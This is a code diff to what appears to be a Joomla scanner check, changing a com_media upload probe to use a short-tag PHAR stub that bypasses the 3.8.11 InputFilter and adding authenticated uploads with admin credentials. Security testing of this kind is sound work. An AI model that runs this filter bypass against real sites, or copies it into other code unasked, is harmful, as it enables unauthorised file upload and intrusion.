@@ -33,11 +33,21 @@ def passive_check(joomla_version: str | None):
 
 
 def build_inert_phar_stub(marker: str) -> bytes:
-    """Build a non-executing image/polyglot that exercises the missing PHAR-stub filter."""
-    return f"GIF89a\n{marker}\n<?php __HALT_COMPILER(); ?>\n".encode()
+    """Build a non-executing image/polyglot that exercises the missing PHAR-stub filter.
+
+    The short open tag avoids the 3.8.11 InputFilter's ``<?php`` check; the
+    short-tag scan is limited to a different extension list and skips ``.gif``.
+    """
+    return f"GIF89a\n{marker}\n<? __HALT_COMPILER(); ?>\n".encode()
 
 
-def probe_upload(target_url: str, timeout: int = 12, proxy: str | None = None) -> dict[str, Any]:
+def probe_upload(
+    target_url: str,
+    timeout: int = 12,
+    proxy: str | None = None,
+    admin_user: str | None = None,
+    admin_pass: str | None = None,
+) -> dict[str, Any]:
     marker = f"PROOFCMS_PHAR_{rand_str(12)}"
     filename = f"proofcms-{rand_str(8)}.gif"
     payload = build_inert_phar_stub(marker)
@@ -49,6 +59,8 @@ def probe_upload(target_url: str, timeout: int = 12, proxy: str | None = None) -
         content_type="image/gif",
         timeout=timeout,
         proxy=proxy,
+        admin_user=admin_user,
+        admin_pass=admin_pass,
     )
 
 
@@ -59,6 +71,7 @@ def check(
     timeout: int = 12,
     proxy: str | None = None,
     exploit_mode: str = "safe",
+    aggressive_command: str | None = None,
     **kwargs: Any,
 ):
     finding = passive_check(joomla_version)
@@ -68,7 +81,16 @@ def check(
         finding.detail += " Active verification writes an inert file and is available only in aggressive lab mode."
         return finding
 
-    proof = probe_upload(target_url, timeout=timeout, proxy=proxy)
+    admin_user = admin_pass = None
+    if aggressive_command and ":" in aggressive_command:
+        admin_user, admin_pass = aggressive_command.split(":", 1)
+    proof = probe_upload(
+        target_url,
+        timeout=timeout,
+        proxy=proxy,
+        admin_user=admin_user,
+        admin_pass=admin_pass,
+    )
     finding.exploit_ran = True
     if proof.get("accepted"):
         finding.status = "VULNERABLE_UPLOAD_ONLY"
@@ -76,7 +98,8 @@ def check(
         finding.proof_url = proof["proof_url"]
         finding.uploaded_filename = proof["uploaded_filename"]
         finding.detail = (
-            "Legacy com_media accepted and served a GIF file containing an inert PHAR stub marker. "
+            "The authenticated com_media upload accepted and served a GIF containing a short-tag PHAR "
+            "stub (<? __HALT_COMPILER(); ?>), bypassing the Joomla 3.8.11 InputFilter. "
             "No executable PHP or command was included."
         )
         finding.action = (
@@ -89,9 +112,10 @@ def check(
         finding.detail = (
             "The prepared inert PHAR-stub upload was not publicly retrievable. "
             + (
-                "A live anonymous com_media upload form was found, but this payload was rejected or discarded. "
+                "A live com_media upload form was found, but this payload was rejected or discarded. "
                 if surface
-                else "No compatible anonymous com_media upload form was exposed. "
+                else "No compatible com_media upload form was exposed (supply admin credentials via "
+                "--aggressive-command user:pass). "
             )
             + "The affected InputFilter may still be present. Attempts: "
             + "; ".join(proof.get("attempts", []))
